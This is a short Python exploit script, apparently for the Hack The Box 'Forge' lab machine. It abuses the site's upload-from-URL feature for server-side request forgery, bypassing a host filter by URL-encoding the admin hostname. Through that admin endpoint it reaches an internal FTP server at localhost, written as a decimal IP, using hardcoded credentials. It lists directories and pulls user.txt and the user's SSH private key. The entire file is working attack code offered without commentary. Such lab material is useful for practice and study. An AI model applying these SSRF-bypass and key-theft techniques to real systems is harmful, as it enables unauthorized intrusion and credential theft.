#!/usr/bin/env python3
import requests
import re
from colorama import Fore


def do_ssrf(uri=''):
    print(Fore.GREEN + 'SSRF for /' + uri)
    url = 'http://forge.htb/upload'
    ssrf = 'http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/'
    r = requests.post(url, data={'url': ssrf + uri, 'remote': 1})
    response = r.text
    file_url = re.search('href="http://forge.htb/uploads/.{20}"', r.text)[0][6:-1]
    print(file_url)
    r = requests.get(file_url)
    print(Fore.YELLOW + r.text)


def exploit():
    do_ssrf()
    do_ssrf('announcements')
    do_ssrf('upload')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/user.txt')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/snap/lxd/')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/snap/lxd/20326/')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/snap/lxd/21029/')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/snap/lxd/common/') 
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/snap/lxd/current/')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/.ssh/')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/.ssh/id_rsa')
    do_ssrf('upload?u=ftp://user:heightofsecurity123!@2130706433/.ssh/authorized_keys')


if __name__=='__main__':
    exploit()
